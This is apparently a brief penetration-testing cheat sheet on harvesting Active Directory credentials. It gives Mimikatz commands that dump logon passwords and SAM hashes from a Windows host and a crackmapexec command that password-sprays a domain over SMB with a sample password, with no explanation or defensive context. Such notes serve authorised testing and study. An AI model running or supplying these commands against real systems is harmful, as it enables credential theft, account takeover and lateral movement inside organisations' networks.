# Cached AD Credentials

## Mimikatz

```shell
sekurlsa::logonpasswords
lsadump::sam
```

## Password Spray

```shell
crackmapexec smb <IP> -u users.txt -p 'Password123!' -d domain --continue-on-success
```
